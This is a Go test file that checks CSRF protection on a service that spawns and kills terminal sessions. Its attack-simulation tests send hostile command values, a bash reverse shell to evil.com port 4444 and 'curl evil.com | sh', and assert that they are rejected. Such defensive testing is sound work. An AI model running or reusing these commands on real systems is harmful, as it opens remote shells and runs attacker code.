package main

import (
	"net/http"
	"net/http/httptest"
	"net/url"
	"strings"
	"testing"
)

func TestCSRF_CrossSitePostRejected(t *testing.T) {
	mux := http.NewServeMux()
	mux.HandleFunc("/spawn", handleSpawn)
	handler := newCSRFHandler(mux)

	form := url.Values{}
	form.Set("dir", "/tmp")
	form.Set("cmd", "echo")

	w := crossSitePost(t, handler, "/spawn", form)

	if w.Code != http.StatusForbidden {
		t.Errorf("cross-site POST: expected 403, got %d", w.Code)
	}
}

func TestCSRF_SameSitePostAccepted(t *testing.T) {
	mux := http.NewServeMux()
	mux.HandleFunc("/", handleIndex)
	mux.HandleFunc("/spawn", handleSpawn)
	handler := newCSRFHandler(mux)

	form := url.Values{}
	form.Set("dir", "/tmp")
	form.Set("cmd", "echo")

	w := sameSitePost(t, handler, "/spawn", form)

	if w.Code == http.StatusForbidden {
		t.Errorf("same-site POST: got 403 (body: %s)", w.Body.String())
	}
}

func TestCSRF_CrossOriginPostRejected(t *testing.T) {
	mux := http.NewServeMux()
	mux.HandleFunc("/spawn", handleSpawn)
	handler := newCSRFHandler(mux)

	form := url.Values{}
	form.Set("dir", "/tmp")
	form.Set("cmd", "echo")

	req := httptest.NewRequest("POST", "/spawn", strings.NewReader(form.Encode()))
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("Origin", "https://evil.com")

	w := httptest.NewRecorder()
	handler.ServeHTTP(w, req)

	if w.Code != http.StatusForbidden {
		t.Errorf("cross-origin POST: expected 403, got %d", w.Code)
	}
}

func TestCSRF_AllPostEndpointsProtected(t *testing.T) {
	mux := http.NewServeMux()
	mux.HandleFunc("/connect/", handleConnect)
	mux.HandleFunc("/spawn", handleSpawn)
	mux.HandleFunc("/spawn-project", handleSpawn)
	mux.HandleFunc("/kill/", handleKill)
	handler := newCSRFHandler(mux)

	endpoints := []string{
		"/connect/test-session",
		"/spawn",
		"/spawn-project",
		"/kill/test-session",
	}

	for _, path := range endpoints {
		form := url.Values{}
		form.Set("dir", "/tmp")
		form.Set("cmd", "echo")
		form.Set("project", "test")

		w := crossSitePost(t, handler, path, form)

		if w.Code != http.StatusForbidden {
			t.Errorf("cross-site POST %s: expected 403, got %d", path, w.Code)
		}
	}
}

// =============================================================================
// ATTACK SIMULATIONS
// =============================================================================

func TestAttack_CrossSiteSpawnReverseShell(t *testing.T) {
	mux := http.NewServeMux()
	mux.HandleFunc("/spawn", handleSpawn)
	handler := newCSRFHandler(mux)

	form := url.Values{}
	form.Set("dir", "/tmp")
	form.Set("cmd", "bash -c 'bash -i >& /dev/tcp/evil.com/4444 0>&1'")

	w := crossSitePost(t, handler, "/spawn", form)

	if w.Code != http.StatusForbidden {
		t.Errorf("ATTACK SUCCEEDED: Cross-site reverse shell spawn returned %d, expected 403", w.Code)
	}
}

func TestAttack_HiddenFormAutoSubmit(t *testing.T) {
	mux := http.NewServeMux()
	mux.HandleFunc("/spawn", handleSpawn)
	handler := newCSRFHandler(mux)

	form := url.Values{}
	form.Set("dir", "/tmp")
	form.Set("cmd", "curl evil.com | sh")

	w := crossSitePost(t, handler, "/spawn", form)

	if w.Code != http.StatusForbidden {
		t.Errorf("ATTACK SUCCEEDED: Hidden form CSRF returned %d, expected 403", w.Code)
	}
}

func TestAttack_ImgTagSpawnTtyd(t *testing.T) {
	req := httptest.NewRequest("GET", "/connect/claude-project-cozy-otter", nil)
	w := httptest.NewRecorder()
	handleConnect(w, req)

	if w.Code != http.StatusMethodNotAllowed {
		t.Errorf("ATTACK SUCCEEDED: img tag GET request returned %d, expected 405", w.Code)
	}
}

func TestAttack_KillAllSessions(t *testing.T) {
	mux := http.NewServeMux()
	mux.HandleFunc("/kill/", handleKill)
	handler := newCSRFHandler(mux)

	form := url.Values{}

	w := crossSitePost(t, handler, "/kill/claude-project-happy-otter", form)

	if w.Code != http.StatusForbidden {
		t.Errorf("ATTACK SUCCEEDED: Session kill DoS returned %d, expected 403", w.Code)
	}
}
